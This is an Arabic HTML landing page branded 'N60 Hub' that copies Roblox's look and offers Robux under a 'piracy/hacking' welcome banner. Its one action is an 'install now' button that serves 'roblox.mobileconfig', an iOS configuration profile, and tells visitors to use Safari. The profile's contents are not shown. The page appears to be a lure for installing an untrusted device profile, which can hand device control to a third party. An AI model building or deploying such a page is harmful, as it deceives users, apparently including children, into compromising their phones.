<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>N60 Hub | تثبيت Roblox Robux</title>
    <!-- استدعاء خطوط قوقل وتصميم احترافي -->
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Cairo', sans-serif;
            background-color: #1a1b1d; /* لون خلفية روبلوكس الغامق */
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        .container {
            text-align: center;
            background: #252729;
            padding: 40px 30px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            width: 90%;
            max-width: 400px;
            border-top: 5px solid #00b06f; /* لون روبلوكس الأخضر الشهير */
        }

        .logo {
            width: 80px;
            height: 80px;
            background-color: #ffffff;
            border-radius: 18px;
            margin: 0 auto 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
        }

        .logo img {
            width: 60px;
        }

        h1 {
            font-size: 24px;
            margin-bottom: 10px;
            color: #ffffff;
        }

        p {
            font-size: 16px;
            color: #adb5bd;
            margin-bottom: 30px;
        }

        .welcome-msg {
            background: rgba(0, 176, 111, 0.1);
            color: #00b06f;
            padding: 10px;
            border-radius: 10px;
            font-weight: bold;
            margin-bottom: 25px;
            border: 1px dashed #00b06f;
        }

        .btn-install {
            background-color: #00b06f;
            color: white;
            padding: 15px 40px;
            text-decoration: none;
            border-radius: 8px;
            font-weight: bold;
            font-size: 18px;
            display: block;
            transition: transform 0.2s, background-color 0.2s;
            box-shadow: 0 4px 0 #008453;
        }

        .btn-install:active {
            transform: translateY(4px);
            box-shadow: 0 0 0;
        }

        .footer {
            margin-top: 25px;
            font-size: 12px;
            color: #6c757d;
        }

        /* أنيميشن بسيط */
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .container { animation: fadeIn 0.8s ease-out; }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo">
            <!-- أيقونة روبلوكس -->
            <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" alt="Roblox Icon">
        </div>
        
        <div class="welcome-msg">مرحباً بك في قرصنة N60 Hub</div>
        
        <h1>تثبيت تطبيق Roblox</h1>
        <p>اضغط على الزر أدناه لبدء تثبيت ملف التعريف الخاص بك</p>
        
        <a href="roblox.mobileconfig" class="btn-install">تثبيت الآن</a>
        
        <div class="footer">
            يجب استخدام متصفح <b>Safari</b> لتثبيت ملف التعريف بنجاح.
        </div>
    </div>

</body>
</html>
